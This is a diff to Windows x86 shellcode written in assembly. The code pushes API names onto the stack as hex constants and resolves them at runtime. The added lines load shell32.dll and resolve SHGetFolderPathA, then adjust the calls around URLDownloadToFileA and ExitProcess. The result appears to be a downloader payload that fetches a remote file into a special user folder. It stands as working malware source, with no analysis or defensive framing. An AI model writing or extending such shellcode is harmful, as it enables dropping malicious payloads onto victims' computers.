@@ -63,6 +63,17 @@ add esp, 12
 push eax                               ; DLL base on the stack         
 
 xor eax, eax
+mov eax, 0x236c6c64
+push eax
+sub dword [esp + 3], 0x23
+push 0x2e32336c
+push 0x6c656873
+push esp                               ; String on the stack           
+call [esp + 20]
+add esp, 12
+push eax                               ; DLL base on the stack         
+
+xor eax, eax
 mov ax, 0x4165
 push eax
 push 0x6c69466f
@@ -70,8 +81,22 @@ push 0x5464616f
 push 0x6c6e776f
 push 0x444c5255
 push esp                               ; String on the stack            
-push dword [esp + 24] 
-call [esp + 36]
+push dword [esp + 28] 
+call [esp + 40]
+add esp, 20
+push eax                               ; Function address on the stack 
+
+; GetProcAddress(shell32.dll, SHGetFolderPathA)
+
+xor eax, eax                           ; EAX = 0                       
+push eax                               ; NULL on the stack             
+push 0x41687461
+push 0x50726564
+push 0x6c6f4674
+push 0x65474853
+push esp                               ; String on the stack            
+push dword [esp + 28] 
+call [esp + 44]
 add esp, 20
 push eax                               ; Function address on the stack 
 
@@ -82,11 +107,18 @@ sub dword [esp + 3], 0x23
 push 0x636f7250
 push 0x74697845
 push esp                               ; String on the stack            
-push dword [esp + 32] 
-call [esp + 32]
+push dword [esp + 40] 
+call [esp + 40]
 add esp, 12
 push eax                               ; Function address on the stack 
 
+push 0x4277dc9
+xor eax, eax
+push eax
+push 0x1d
+xor eax, eax
+push eax
+call [ESP + 20]
 xor eax, eax                            ; EAX = 0                       
 push eax                                ; NULL on the stack             
 push 0x65726177
@@ -132,7 +164,7 @@ push dword [ESP + 8]
 push dword [ESP + 108]
 xor eax, eax
 push eax
-call [ESP + 152]
+call [ESP + 156]
 add ESP, 128
 xor eax, eax
 push eax
